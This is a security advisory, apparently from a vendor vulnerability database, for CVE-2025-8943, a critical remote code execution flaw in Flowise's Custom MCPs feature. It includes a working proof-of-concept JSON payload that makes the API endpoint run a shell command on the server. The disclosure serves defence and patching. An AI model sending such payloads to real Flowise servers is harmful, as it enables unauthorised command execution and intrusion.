---
description: CVE-2025-8943, CRITICAL, Flowise OS command remote code execution
title: Flowise OS command remote code execution
date_published: "2025-08-14"
last_updated: "2025-08-14"
xray_id: JFSA-2025-001380578
vul_id: CVE-2025-8943
cvss: 9.8
severity: critical
discovered_by: Assaf Levkovich
type: vulnerability

---

## Summary

Unsupervised OS command execution leads to remote code execution by network attackers

## Component

[flowise](https://www.npmjs.com/package/flowise?activeTab=code)

## Affected versions

(,)

## Description

The Custom MCPs feature is designed to execute OS commands, for instance, using tools like `npx` to spin up local MCP Servers. However, Flowise's inherent authentication and authorization model is minimal and lacks role-based access controls (RBAC). Furthermore, in certain Flowise versions the default installation operates without authentication unless explicitly configured. This combination allows either unauthenticated or authenticated users to execute unsandboxed OS commands. 

## PoC

Send the following payload to the `node-load-method/customMCP` API endpoint -

```json
{
    "inputs":
    {
        "mcpServerConfig":
        {
            "command": "touch",
            "args":
            [
                "/tmp/yofitofi"
            ]
        }
    },
    "loadMethod": "listActions"
}
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References



